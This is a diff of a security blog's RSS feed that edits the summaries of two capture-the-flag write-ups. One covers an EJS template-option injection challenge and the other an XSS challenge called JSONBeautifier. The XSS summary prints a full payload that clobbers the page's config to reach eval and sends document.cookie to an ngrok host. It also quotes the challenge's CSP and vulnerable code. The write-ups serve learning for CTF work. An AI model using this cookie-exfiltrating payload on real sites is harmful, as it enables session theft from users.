@@ -17,12 +17,12 @@
     </item>
     
     <item>
-      <title>hxp valentine wp</title>
+      <title>hxpCTF valentine WP</title>
       <link>http://blog.an4er.top/post/hxp_valentine/</link>
       <pubDate>Wed, 22 Mar 2023 00:00:00 +0000</pubDate>
       
       <guid>http://blog.an4er.top/post/hxp_valentine/</guid>
-      <description>hxp valentine wp 签到就算成功
+      <description>签到就算成功
 challenge 题目关键过滤点在while循环检测ejs的模板语法，如果存在除了复制语法外则返回400
 solve 首先查看ejs的渲染函数，根据注释和查看源码，可以知道shallowCopyFromList函数的作用是遍历data中的键值对，如果data中有键名为_OPTS_PASSABLE_WITH_DATA其中一个，则将其复制到opts中
 所以我们现在可以通过data可控以下几个参数
@@ -37,7 +37,7 @@ var _OPTS_PASSABLE_WITH_DATA = [&amp;#39;delimiter&amp;#39;, &amp;#39;scope&amp;
       <pubDate>Wed, 25 Jan 2023 00:00:00 +0000</pubDate>
       
       <guid>http://blog.an4er.top/post/idekxss/</guid>
-      <description>idekXSS JSONBeautifier 从@zeyu2001师傅的payload学习赛中卡住的相关基础知识后自己尝试复现
+      <description>JSONBeautifier 从@zeyu2001师傅的payload学习赛中卡住的相关基础知识后自己尝试复现
 {&amp;#34;x&amp;#34;:&amp;#34;&amp;lt;/pre&amp;gt;&amp;lt;iframe name=&amp;#39;fetch(&amp;amp;quot;http://0.tcp.ngrok.io:15336?cookie=&amp;amp;quot;+document.cookie)&amp;#39; srcdoc=&amp;#39;&amp;lt;iframe name=config srcdoc=&amp;amp;#039;&amp;lt;head&amp;gt;&amp;lt;title id=debug&amp;gt;test&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;frameset id=opts cols=x:eval(/*, */name)//&amp;gt;&amp;lt;/frameset&amp;gt;&amp;amp;#039;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;div id=json-input&amp;gt;{&amp;amp;quot;x&amp;amp;quot;:&amp;amp;quot*/name)//&amp;amp;quot}&amp;lt;/div&amp;gt;&amp;lt;script src=static/js/main.js&amp;gt;&amp;lt;/script&amp;gt;&amp;#39;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;#34;} 源码不多，简单看一下源码，一个flask应用为服务添加CSP：
 response.headers[&amp;#39;Content-Security-Policy&amp;#39;] = &amp;#34;script-src &amp;#39;unsafe-eval&amp;#39; &amp;#39;self&amp;#39;; object-src &amp;#39;none&amp;#39;;&amp;#34; 这允许我们使用同源的JS文件和eval函数，然后有个main.js文件，关键代码如下：
 userJson = JSON.parse(inputBox.textContent); const cols = this.config?.opts?.cols || defaults.opts.cols; output = JSON.stringify(userJson, null, cols); if(this.config?.debug || defaults.debug){ eval(`beautified = ${output}`); return beautified; }; outputBox.innerHTML = `&amp;lt;pre&amp;gt;${output}&amp;lt;/pre&amp;gt;` 因为我们的最终目的是XSS，所以我们需要进入eval函数，也就是需要给this.config.debug赋值，而且下面outputBox.innerHTML的赋值中的output可控，JSON.stringify的第三个参数可控的话可以导致逃逸出字符串
